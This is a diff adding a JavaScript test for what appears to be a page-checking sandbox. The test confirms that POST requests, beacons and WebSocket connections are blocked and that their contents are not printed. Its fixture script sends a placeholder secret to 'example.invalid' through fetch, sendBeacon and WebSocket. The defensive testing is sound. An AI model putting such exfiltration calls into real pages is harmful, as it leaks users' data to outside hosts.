@@ -73,6 +73,21 @@ test('external fetch is blocked without printing the URL or its data', () => {
   } finally { fs.rmSync(root, {recursive: true, force: true}); }
 });
 
+test('POST, beacons and socket attempts are blocked without printing their contents', () => {
+  const root = fixture(`<script>
+    fetch('data.json', {method: 'POST', body: 'PRIVATE_TEST_VALUE'}).catch(()=>{});
+    navigator.sendBeacon('https://example.invalid/', 'PRIVATE_TEST_VALUE');
+    try { new WebSocket('wss://example.invalid/'); } catch (e) {}
+  </script>`);
+  try {
+    const result = run(root);
+    assert.equal(result.status, 1, result.stderr + result.stdout);
+    assert.match(result.stdout, /non-GET request/);
+    assert.match(result.stdout, /a beacon, socket or peer connection was blocked/);
+    assert.doesNotMatch(result.stdout + result.stderr, /PRIVATE_TEST_VALUE|example\.invalid/);
+  } finally { fs.rmSync(root, {recursive: true, force: true}); }
+});
+
 test('script exceptions and storage writes are detected without values', () => {
   const root = fixture(`<script>localStorage.setItem('synthetic','PRIVATE_TEST_VALUE'); throw new Error('PRIVATE_TEST_VALUE');</script>`);
   try {
